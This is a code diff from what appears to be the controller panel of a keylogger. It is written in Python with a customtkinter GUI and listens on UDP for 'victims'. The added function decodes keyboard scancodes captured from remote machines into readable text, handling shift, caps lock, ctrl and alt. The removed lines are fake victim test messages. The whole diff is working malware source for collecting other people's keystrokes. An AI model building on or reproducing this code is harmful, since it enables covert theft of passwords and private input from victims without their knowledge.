@@ -34,10 +34,57 @@ KEYLOGS_PORT = 49324
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock.bind(('', SCAN_PORT))
 
+shift_on = False
+caps_on = False
+ctrl_on = False
+alt_on = False
+
 def decode_scancodes(string):
+
+    global shift_on
+    global caps_on
+    global ctrl_on
+    global alt_on
+    shift_dict = {'1': '!', '2': '@', '3': '#', '4': '$', '5': '%', 
+                  '6': '^', '7': '&', '8': '*', '9': '(', '0': ')', 
+                  '-': '_', '=': '+', '`': '~', ',': '<', '.': '>', 
+                  '/': '?', ';': ':', '\'': '"', '[': '{', ']': '}', 
+                  '\\': '|'}
+
     out = ""
     for i in string:
-        out += codes[int(i)]
+        if i & 0x80:        # released
+            print(f'released {codes[int(i & (~0x80))]}')
+            i &= ~0x80
+            if codes[int(i)] == "CTRL":
+                ctrl_on = False
+            elif codes[int(i)] in ("LSHIFT", "RSHIFT"):
+                shift_on = False
+            elif codes[int(i)] == "ALT":
+                alt_on = False
+        else:               # pressed
+            print(f'pressed {codes[int(i)]}')
+            if codes[int(i)] == "CTRL":
+                ctrl_on = True
+            elif codes[int(i)] in ("LSHIFT", "RSHIFT"):
+                shift_on = True
+            elif codes[int(i)] == "ALT":
+                alt_on = True
+            elif codes[int(i)] == "CAPSLOCK":
+                caps_on = not caps_on
+            else:
+                if (shift_on or caps_on) and 'a' <= codes[int(i)] <= 'z':
+                    out += codes[int(i)].upper()
+                elif shift_on and codes[int(i)] in shift_dict.keys():
+                    out += shift_dict[codes[int(i)]]
+                # elif shift_on:
+                #     out += "SHIFT+"+codes[int(i)]
+                elif alt_on:
+                    out += "ALT+"+codes[int(i)]
+                elif ctrl_on:
+                    out += "CTRL+"+codes[int(i)]
+                else:
+                    out += codes[int(i)]
     return out
 
 class EntryFrame(ctk.CTkFrame):
@@ -87,9 +134,6 @@ class ScanningMachinesFrame(ctk.CTkFrame):
     def start(self):
 
         self.incoming_queue = queue.Queue()
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
         self.stop_scanning = False
         listening_thread = threading.Thread(target=self.scan_incoming_victims, name='victims-scanning-thread')
         listening_thread.start()
